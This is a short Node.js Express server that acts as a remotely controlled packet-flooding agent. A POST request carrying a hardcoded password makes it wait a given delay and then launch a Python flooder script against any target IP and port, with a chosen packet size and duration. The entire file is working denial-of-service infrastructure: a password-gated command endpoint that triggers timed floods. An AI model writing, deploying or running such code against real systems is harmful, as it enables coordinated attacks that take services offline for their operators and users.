const express = require("express")
const bodyParser = require("body-parser")
const app = express();

//Here we are configuring express to use body-parser as middle-ware.
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//Dummy react on a GET request, just sending some string
app.get("/", function(req,res) {
    res.send("This is the flooder")
})

//React on the post request of the client at /flooder, only if key is a specific string
//runs the flood function
app.post('/flooder',function(req,res) {
    console.log("Got a post")
    if (req.body.key == 'ditiseensoortwachtwoord') {
        instruct_flooder(req.body.offset,
            req.body.sink_ip,
            req.body.sink_port,
            req.body.packet_size,
            req.body.duration) //launc flooder function
        console.log(req.body)
        res.writeHead(200, {'Content-Type': 'text/html'})
        res.end('Now flooding after ' + req.body.offset + ' for ' + req.body.duration + ' seconds')
    } else {
        console.log("Nevermind")
        res.writeHead(400, {'Content-Type': 'text/html'})
        res.end()
    }
})


//Waits <offset> seconds before flooding a host in the options constant
const instruct_flooder = async function(offset,sink_ip,sink_port,packet_size,duration) {
    //Waiting
    console.log("now waiting for " + offset + " seconds")
    await new Promise(resolve => setTimeout(resolve, offset * 1000));
    console.log("Now Flodding for " + duration + " seconds")

    const spawn = require("child_process").spawn;

    //Python arguments: packet_bin_ip, packet_bin_port, packet_size, duration
    const pythonProcess = spawn('python3',["flooder.py", sink_ip, sink_port, packet_size,duration]);


    pythonProcess.stdout.on('data', (data) => {
        console.log(data.toString('hex'))
    });
}


//Listen on port 3000 for incoming requests
app.listen(3000,function() {
    console.log("listening on 3000")
})